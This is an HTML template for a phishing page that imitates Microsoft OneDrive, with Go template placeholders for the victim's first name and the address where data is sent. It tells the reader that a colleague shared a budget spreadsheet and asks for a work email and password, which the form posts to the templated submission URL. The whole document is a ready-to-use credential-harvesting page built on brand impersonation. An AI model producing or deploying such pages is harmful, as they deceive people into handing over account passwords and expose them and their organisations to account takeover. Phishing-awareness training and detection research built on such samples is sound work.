<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Shared document</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;font-family:"Segoe UI",-apple-system,Roboto,Helvetica,Arial,sans-serif;color:#1b1b1b;background:#f3f6fb}
  .top{display:flex;align-items:center;gap:10px;padding:12px 20px;background:#fff;border-bottom:1px solid #e6e6e6}
  .top svg{width:24px;height:24px}
  .top b{font-size:15px;color:#0364b8;font-weight:600}
  .wrap{display:flex;justify-content:center;padding:48px 20px}
  .card{width:460px;max-width:100%;background:#fff;border:1px solid #e6e6e6;box-shadow:0 2px 10px rgba(0,0,0,.08);padding:34px 36px 30px;text-align:center}
  .doc{width:64px;height:64px;margin:0 auto 14px;display:block}
  h1{font-size:19px;font-weight:600;margin:0 0 6px}
  .meta{font-size:13px;color:#605e5c;margin:0 0 2px}
  .file{display:inline-flex;align-items:center;gap:8px;background:#f3f2f1;border:1px solid #edebe9;border-radius:4px;padding:9px 14px;margin:18px 0 6px;font-size:14px}
  .file svg{width:18px;height:18px}
  .divider{border:none;border-top:1px solid #edebe9;margin:22px 0 18px}
  label{display:block;text-align:left;font-size:13px;color:#323130;margin:12px 0 4px}
  input{width:100%;height:36px;border:1px solid #8a8886;border-radius:2px;padding:6px 8px;font-size:15px;outline:none}
  input:focus{border-color:#0364b8}
  button{width:100%;margin-top:20px;height:36px;border:none;border-radius:2px;background:#0364b8;color:#fff;font-size:15px;font-family:inherit;cursor:pointer}
  button:hover{background:#005a9e}
  .foot{text-align:center;font-size:12px;color:#8a8886;padding:20px}
</style>
</head>
<body>
  <div class="top">
    <svg viewBox="0 0 24 24" fill="#0364b8"><path d="M10.5 18.5a4.5 4.5 0 01-.6-8.96 5.5 5.5 0 0110.3-1.3A4 4 0 0120 18.5z"/></svg>
    <b>OneDrive</b>
  </div>
  <div class="wrap">
    <form class="card" method="post" action="{{.SubmitURL}}" autocomplete="off">
      <svg class="doc" viewBox="0 0 48 48"><rect x="9" y="4" width="26" height="40" rx="2" fill="#0364b8"/><rect x="13" y="4" width="26" height="40" rx="2" fill="#2b88d8"/><path d="M19 15h14M19 21h14M19 27h10" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
      <h1>{{.FirstName}}, a document was shared with you</h1>
      <p class="meta">Someone in your organization shared a file via OneDrive.</p>
      <div class="file">
        <svg viewBox="0 0 24 24" fill="#0364b8"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/></svg>
        Q4-Budget-Review.xlsx
      </div>
      <hr class="divider">
      <p class="meta" style="text-align:left">Sign in with your work or school account to view the document.</p>
      <label for="e">Email</label>
      <input id="e" name="email" type="email">
      <label for="p">Password</label>
      <input id="p" name="password" type="password">
      <button type="submit">Open document</button>
    </form>
  </div>
  <div class="foot">Microsoft OneDrive &middot; This email was sent by an automated system.</div>
</body>
</html>
